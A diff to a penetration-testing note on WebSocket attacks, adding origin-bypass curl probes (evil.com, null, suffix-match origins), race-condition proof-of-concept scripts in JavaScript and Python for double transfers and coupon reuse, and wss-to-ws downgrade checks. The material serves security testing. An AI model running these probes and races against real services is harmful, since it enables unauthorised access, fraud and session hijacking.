@@ -136,12 +136,27 @@ ws.onmessage = function(event) {
 </script>
 ```
 
-**Test origin validation:**
+**Test origin validation — try all variants:**
 
 ```bash
-# Does the server accept connections with a modified Origin?
-curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" -H "Origin: https://evil.com" http://target.com/ws
-# If 101 Switching Protocols → no origin check → CSWSH possible
+# Base test — arbitrary attacker origin
+curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
+  -H "Origin: https://evil.com" http://target.com/ws
+
+# null origin (sandboxed iframe sends this)
+curl -i -N ... -H "Origin: null" http://target.com/ws
+
+# Subdomain of target (find XSS on any subdomain to exploit)
+curl -i -N ... -H "Origin: https://sub.target.com" http://target.com/ws
+
+# Suffix match bypass — register domain ending in target.com
+curl -i -N ... -H "Origin: https://eviltarget.com" http://target.com/ws
+
+# HTTP downgrade — server accepts http:// when served on https://
+curl -i -N ... -H "Origin: http://target.com" http://target.com/ws
+
+# If any of these return 101 → CSWSH possible from that origin context
 ```
 
 ---
@@ -225,7 +240,73 @@ wscat -c ws://target.com/dashboard -H "Cookie: session=<token>"
 
 ---
 
-### 5. Denial of Service / Resource Exhaustion
+### 5. Race Conditions
+
+WebSockets allow sending multiple messages without waiting for a response — useful for racing state-changing operations the server processes sequentially.
+
+```javascript
+// PoC — race two operations: transfer funds then immediately cancel
+// Both messages sent before server processes first
+var ws = new WebSocket('wss://target.com/api');
+ws.onopen = function() {
+    ws.send(JSON.stringify({"action": "transfer", "amount": 1000, "to": "attacker_account"}));
+    ws.send(JSON.stringify({"action": "cancel_last_transfer"}));
+    // If server processes these out of order or both succeed → double-spend / bypass
+};
+```
+
+```python
+# Python race — send messages simultaneously from multiple threads
+import websocket, threading, json
+
+TARGET = "wss://target.com/api"
+COOKIE = "session=<value>"
+
+def send_msg(msg):
+    ws = websocket.create_connection(TARGET, cookie=COOKIE)
+    ws.send(json.dumps(msg))
+    print(ws.recv())
+    ws.close()
+
+msgs = [
+    {"action": "redeem_coupon", "code": "SAVE50"},
+    {"action": "redeem_coupon", "code": "SAVE50"},   # same coupon twice
+]
+threads = [threading.Thread(target=send_msg, args=(m,)) for m in msgs]
+for t in threads: t.start()
+for t in threads: t.join()
+```
+
+> [!tip] Race condition candidates: coupon/promo redemption, vote/like actions, balance transfers, inventory claims. If the server checks a state before writing (check-then-act), the WS race window is the time between the two operations.
+
+---
+
+### 6. Protocol Downgrade (`wss://` → `ws://`)
+
+If the app uses `wss://` (encrypted) but the server also accepts `ws://` (plaintext), traffic can be intercepted on the network.
+
+```bash
+# Test if server accepts plaintext WebSocket
+wscat -c ws://target.com/chat       # instead of wss://
+websocat ws://target.com/chat
+
+# In Burp — intercept the upgrade request and change scheme:
+# Original: GET /chat HTTP/1.1  (connecting to wss://)
+# Modify: downgrade to ws:// port 80 in Burp's target tab
+# Or: set up Burp to listen on 80 and redirect to target's ws port
+
+# Check if TLS is actually enforced:
+curl -i -N -H "Connection: Upgrade" -H "Upgrade: websocket" \
+  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
+  http://target.com/chat   # plain HTTP
+# 101 response → plaintext WS accepted → traffic readable on network
+```
+
+> [!note] Mixed content scenarios: if a page is served over HTTPS but loads `ws://` (not `wss://`), modern browsers block it. But native apps, IoT devices, and API clients may not enforce TLS on WS connections.
+
+---
+
+### 7. Denial of Service / Resource Exhaustion
 
 WebSocket connections are persistent — servers may not limit:
 
@@ -330,5 +411,5 @@ Array.from(performance.getEntries()).filter(e => e.initiatorType === 'websocket'
 ---
 
 *Created: 2026-02-27*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
